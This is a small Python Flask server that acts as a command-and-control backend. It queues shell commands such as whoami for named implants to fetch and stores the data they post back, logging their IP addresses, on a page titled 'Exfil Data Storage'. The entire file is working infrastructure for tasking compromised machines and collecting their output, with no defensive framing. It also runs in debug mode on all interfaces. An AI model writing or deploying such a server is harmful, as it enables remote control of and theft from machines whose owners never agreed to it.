
from flask import Flask, request, jsonify
import datetime
app = Flask(__name__)

task_list = {
    "testrun": [
        {"task_id": 1, "task_cmd": "ls"},
        {"task_id": 2, "task_cmd": "whoami"},
        {"task_id": 3, "task_cmd": "pwd"}
    ],
    "nobody": []
}
exfil_data = []

@app.route('/', methods=['GET'])
def index():
    return jsonify({"msg": "Exfil Data Storage", "data": exfil_data})

@app.route('/infil/<name>', methods=['GET'])
def infil(name):
    if len(task_list[name]) != 0:
        return jsonify(task_list[name][0])
    return jsonify(task_list[name])

@app.route('/exfil/<name>', methods=['POST'])
def exfil(name):
    incomming_data = request.json
    incomming_data['ip'] = request.remote_addr
    incomming_data['time'] = datetime.datetime.now()
    exfil_data.append(incomming_data)

    if len(task_list[name]) != 0:
        task_list[name].pop(0)
    return jsonify({"isSuccess": True, "alldata": task_list[name]})

app.run(host='0.0.0.0', port=8080, debug=True)